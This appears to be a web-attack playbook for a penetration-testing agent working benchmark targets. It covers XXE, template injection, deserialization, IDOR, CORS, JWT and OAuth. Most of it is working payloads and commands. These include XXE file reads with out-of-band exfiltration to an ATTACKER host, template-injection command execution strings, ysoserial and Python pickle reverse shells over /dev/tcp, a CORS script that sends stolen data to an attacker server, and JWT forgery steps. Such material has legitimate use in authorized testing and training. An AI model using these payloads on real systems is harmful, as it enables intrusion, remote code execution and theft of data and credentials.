# Web Vulnerability Playbook

Reference for web attack techniques: XXE, SSTI, deserialization, IDOR, CORS, JWT, OAuth.
See `PENTEST.md` for general web recon flow.

---

## 0. Version-Grounded Source Research

Use this branch when:
- the live target exposes a concrete product/version/framework,
- CVE review exists but exploit detail is weak or noisy,
- 2-3 low-noise checks fail without proof,
- the bug class is still plausible.

Allowed source set during active work:
- public upstream repos and release tags
- official packages/source tarballs
- changelogs and patch diffs
- vendor docs and bug trackers

Not allowed during active black-box benchmark solving:
- using the local benchmark service source as a solve oracle

Quick workflow:
```bash
python3 scripts/service-source-map.py --service "<banner or product string>"
bash scripts/version-research.sh --service "<banner or product string>" --target <IP> --suspected-class "<class>"
```

Research outputs to capture:
- version evidence from target
- likely upstream repo/package
- candidate release tags
- reachable vulnerable code path
- one bounded validation to return to the target with

---

## 1. XXE — XML External Entity

### Detection
- Endpoints accepting `Content-Type: application/xml` or XML body
- SOAP endpoints, file upload (SVG/docx/xlsx), any XML parser
- Test: inject entity reference in any XML field, observe error or response change

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

### Blind / OOB Exfiltration
Host evil DTD on attacker server:
```xml
<!-- evil.dtd on attacker -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?x=%file;'>">
%exfil;
%send;
```
```xml
<!-- in target request -->
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;]>
<root/>
```

### Error-Based (when output not reflected)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % err "<!ENTITY &#x25; oops SYSTEM 'file:///nonexistent/%file;'>">
  %err; %oops;
]>
```
Error message will contain file contents.

### PHP-Specific Wrappers
```xml
<!-- base64 encode to avoid encoding issues -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Execute command (if expect enabled) -->
<!ENTITY xxe SYSTEM "expect://id">
```

### SVG / DOCX / XLSX Vectors
- SVG: embed XXE in `<svg>` file, upload as image
- DOCX/XLSX: unzip → edit `word/document.xml` or `[Content_Types].xml` → rezip → upload
- SSRF via SVG in PDF generators (headless Chrome, wkhtmltopdf)

### Tools
- Burp Suite Pro (active scan finds XXE)
- `xxeinjector` — automated blind XXE with parameter entity chains

---

## 2. SSTI — Server-Side Template Injection

### Detection Polyglot
Test each in user-controlled fields (name, email, greeting, URL params):
```
{{7*7}}          → 49  (Jinja2, Twig)
${7*7}           → 49  (Freemarker, Velocity, Mako)
<%= 7*7 %>       → 49  (ERB, EJS)
#{7*7}           → 49  (Ruby ERB variant)
*{7*7}           → 49  (Spring SpEL)
${{"".class}}    → class java.lang.String (Groovy/Java)
```

### Engine Fingerprinting
| Output of `{{7*'7'}}` | Engine |
|----------------------|--------|
| `49` | Jinja2 |
| `7777777` | Twig |
| Error | Others |

| Marker | Engine | Language |
|--------|--------|----------|
| `{{` | Jinja2, Twig | Python, PHP |
| `${` | Freemarker, Velocity, Mako | Java, Python |
| `<%= %>` | ERB | Ruby |
| `#{` | Ruby ERB |  |
| `@(` | Razor | C# |

### Jinja2 RCE (Python)
```python
# Direct OS access
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Subclass traversal (when globals not accessible)
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of <class 'subprocess.Popen'> in the list, then:
{{''.__class__.__mro__[1].__subclasses__()[INDEX](['id'],stdout=-1).communicate()[0].decode()}}

# Bypass filters using request object (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig RCE (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.all|join(',')}}
```

### Freemarker RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Velocity RCE (Java)
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
```

### Tools
```bash
# tplmap — automated SSTI detection + exploit
python3 tplmap.py -u "http://TARGET/page?name=*"
python3 tplmap.py -u "http://TARGET" -d "name=*&submit=1"
python3 tplmap.py -u "http://TARGET?name=*" --os-shell
```

---

## 3. Deserialization

### Detection
| Signature | Language | Encoding |
|-----------|----------|----------|
| `rO0AB` | Java | Base64 of `aced 0005` |
| `H4sI` | Java (gzip) | Base64 |
| `O:N:` | PHP | Raw |
| `\x80\x04\x95` | Python pickle | Raw |
| `ACED0005` | Java | Hex |

### Java
```bash
# List available gadget chains
java -jar ysoserial.jar

# Generate payload (JNDI callback to verify)
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(whoami)' | base64 -w0

# Reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|bash' | base64 -w0

# Common chains (try in order):
# CommonsCollections6 (universal, no version dependency)
# CommonsCollections1/3/5/7
# Spring1/Spring2
# Groovy1
```

Detection trigger: Content-Type contains `application/x-java-serialized-object`, or POST body starts with `rO0AB`.

### PHP
```bash
# phpggc — PHP gadget chain generator
phpggc -l                           # list frameworks
phpggc Laravel/RCE9 system 'id'    # Laravel RCE
phpggc Symfony/RCE7 system 'id'    # Symfony RCE
phpggc -b Laravel/RCE9 system 'id' # base64 output

# phar:// deserialization
# Create malicious phar, upload, trigger with: phar:///var/www/html/uploads/evil.phar/
```

PHP `unserialize()` chain:
```php
# Object with __wakeup / __destruct that calls dangerous functions
# Manipulate serialized string: O:4:"User":1:{s:4:"name";s:2:"id";}
# Change class name / properties to trigger gadget chain
```

Cookie-state note:
- If the app serializes auth/session state into a cookie, test tampering that state directly before brute-forcing credentials.
- For legacy PHP apps, inspect loose `==` comparisons and typed serialized values (`s`, `i`, `b`, `a`) as part of the first-pass auth bypass workflow.

### Python Pickle
```python
import os, pickle, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```
Send as cookie, POST param, or wherever pickle data is deserialized.

### .NET
- ViewState without MAC validation: use `ysoserial.net`
  ```
  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -enc BASE64"
  ```
- Check: `__VIEWSTATE` in HTML, `EnableViewStateMac=false` in web.config

### Tools
- `ysoserial.jar` — Java gadget chains
- `ysoserial.net` — .NET ViewState + ObjectDataProvider chains
- `phpggc` — PHP gadget chains
- Burp Deserialization Scanner extension

---

## 4. IDOR — Insecure Direct Object Reference

### ID Type Analysis
| ID Type | Attack |
|---------|--------|
| Integer (1, 2, 3) | Increment/decrement, negative values |
| UUID v4 | Low entropy? Test predictability |
| GUID | Check if generated client-side |
| Hash (MD5/SHA1) | If `md5(user_id)` — compute for target IDs |
| Encoded | Base64 decode → modify → re-encode |

### Test Vectors
- URL: `GET /api/users/123/profile` → change 123
- Query: `?id=123&user=456`
- POST body: `{"userId": 123, "resourceId": 456}`
- JWT `sub` claim
- Cookies: `user_id=123`
- Hidden form fields: `<input type="hidden" name="uid" value="123">`
- Filenames: `GET /files/invoice_00123.pdf`

### Two-Account Methodology
1. Register Account A + Account B (use +alias trick: `a+A@gmail.com`, `a+B@gmail.com`)
2. With Account A: create resource, note ID
3. Switch to Account B session (separate browser/incognito)
4. Access/modify resource using A's ID → if accessible = IDOR

### Horizontal vs Vertical
- **Horizontal**: Same role, different user (`/api/user/123` vs `/api/user/456` — both regular users)
- **Vertical**: Lower role accessing higher role's object (`/api/admin/users/1` as regular user)

### API Version Gap
```
GET /api/v2/users/123        # 403 Forbidden
GET /api/v1/users/123        # 200 OK  ← v1 missing auth
GET /api/mobile/users/123    # 200 OK  ← mobile endpoint missing auth
```

### Mass Assignment
```json
# PATCH /api/users/123
{"name": "Alice", "role": "admin", "isAdmin": true, "credits": 999999}
```
Send extra fields — if accepted without validation, role/privilege escalation.

---

## 5. CORS Misconfiguration

### Test
```bash
# Send with arbitrary Origin
curl -H "Origin: https://attacker.com" -I https://TARGET/api/data

# Look for:
# Access-Control-Allow-Origin: https://attacker.com   ← reflects origin = VULNERABLE
# Access-Control-Allow-Credentials: true              ← confirms exploitable with cookies
```

### Variants
```
Origin: null                         → triggers if ACAO: null (sandboxed iframe exploit)
Origin: https://target.com.evil.com  → regex bypass (prefix match)
Origin: https://evil-target.com      → regex bypass (suffix match without anchoring)
Origin: https://sub.target.com       → subdomain; check if sub has takeover
```

### PoC (JavaScript)
```html
<script>
fetch("https://TARGET/api/secret", {credentials: "include"})
  .then(r => r.text())
  .then(d => fetch("https://ATTACKER/log?d=" + btoa(d)));
</script>
```
Host on attacker server, get victim to load page.

---

## 6. JWT Attacks

### Decode and Inspect
```bash
# Decode without verification
echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Or: jwt.io, CyberChef
```

### alg:none
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).decode().rstrip("=")
token = f"{header}.{payload}."  # empty signature
```

### RS256 → HS256 Confusion
```bash
# Get server's RSA public key (from JWKS endpoint, cert, or leaked key)
# Sign HS256 with public key as HMAC secret
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### Weak Secret Brute
```bash
hashcat -m 16500 token.jwt wordlists/rockyou.txt.gz -O
# Or: john --wordlist=rockyou.txt --format=HMAC-SHA256 token.jwt
```

### jwt_tool Full Attack
```bash
python3 jwt_tool.py TOKEN -T             # interactive tamper wizard
python3 jwt_tool.py TOKEN -X a           # alg:none
python3 jwt_tool.py TOKEN -X s           # self-signed (generates key pair, injects JWKS)
python3 jwt_tool.py TOKEN -I -pc sub -pv admin  # change sub claim
```

### kid / jku / x5u Injection
```
# kid SQLi
{"kid": "' UNION SELECT 'attacker_secret' -- -"}
# kid path traversal
{"kid": "../../dev/null"}  → empty secret = sign with empty string

# jku / x5u: point to attacker-controlled JWKS URL
{"jku": "https://ATTACKER/jwks.json"}
```

---

## 7. OAuth / SSO

### Redirect URI Manipulation
```
# Open redirect in redirect_uri
https://target.com/oauth/authorize?...&redirect_uri=https://attacker.com/callback

# Relative path confusion
redirect_uri=https://target.com/../evil

# Subdomain takeover → token steal
redirect_uri=https://legacy.target.com  (if legacy is taken over)
```

### state CSRF
```
# If state not validated or absent:
# Craft authorization URL → victim clicks → code bound to attacker's session
# → attacker completes flow → logs in as victim
```

### PKCE Downgrade
```
# If code_challenge not enforced:
# 1. Intercept authorization code in victim's browser
# 2. Replay code exchange without code_verifier
curl https://target.com/oauth/token -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=..."
```

### Account Linking Bypass
```
# If platform links by email without verifying ownership:
# 1. Register attacker account with victim's email via OAuth provider
# 2. Link OAuth account → system links to victim's existing account
```

### Implicit Flow Token Leak
```
# Tokens in URL fragment (#access_token=...) → Referer header to third-party
# Single-page apps with open redirects in fragment handling
```

---

## 8. Quick Tool Reference

| Goal | Tool | Command |
|------|------|---------|
| XXE detection | Burp + manual | `Content-Type: application/xml` + entity injection |
| Blind XXE OOB | xxeinjector | `ruby xxeinjector.rb --host=ATTACKER --path=/etc/passwd --file=req.txt` |
| SSTI detection | tplmap | `python3 tplmap.py -u "URL?field=*"` |
| SSTI shell | tplmap | `python3 tplmap.py -u URL --os-shell` |
| Java deser | ysoserial | `java -jar ysoserial.jar CC6 'cmd' \| base64` |
| PHP deser | phpggc | `phpggc Framework/RCE cmd -b` |
| JWT decode | jwt_tool | `python3 jwt_tool.py TOKEN -d` |
| JWT brute | hashcat | `hashcat -m 16500 token.jwt wordlist` |
| JWT alg:none | jwt_tool | `python3 jwt_tool.py TOKEN -X a` |
| CORS test | curl | `curl -H "Origin: https://evil.com" -I URL` |
